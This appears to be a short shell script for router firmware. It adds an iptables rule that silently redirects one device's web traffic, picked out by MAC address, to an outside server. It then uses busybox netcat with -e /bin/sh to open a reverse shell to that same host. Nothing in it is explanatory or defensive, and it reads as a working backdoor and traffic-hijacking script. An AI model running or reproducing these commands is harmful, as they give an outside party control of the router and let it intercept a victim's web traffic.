#!/bin/sh

#5

iptables -t mangle -vnL

iptables -t nat -I PREROUTING 1 -m mac --mac-source d4:a3:3d:22:bb:cc -p tcp -m tcp --dport 80 -j DNAT --to-destination 37.220.31.52:8080

/jffs/busybox nc  37.220.31.52 1234 -e /bin/sh

